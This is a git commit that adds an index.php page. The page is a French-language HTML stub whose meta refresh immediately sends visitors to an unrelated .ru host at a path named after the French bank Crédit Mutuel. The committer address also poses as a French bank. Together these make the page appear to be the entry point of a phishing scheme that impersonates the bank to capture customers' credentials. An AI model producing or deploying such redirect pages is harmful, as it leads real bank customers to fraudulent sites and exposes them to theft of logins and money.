e618f52a57c5ed66df3749ebe4d6325fc9827a55
Victony7785 <infobanquefrancefr@gmail.com>
2026-01-27 06:45:34 +0100

    Create index.php

---
+++ index.php
@@ -0,0 +1,11 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="refresh" content="0; url=http://cn011301.tw1.ru/creditmutuel-fr">
+  <title>Redirection...</title>
+</head>
+<body>
+  <p>Redirection en cours…</p>
+</body>
+</html>
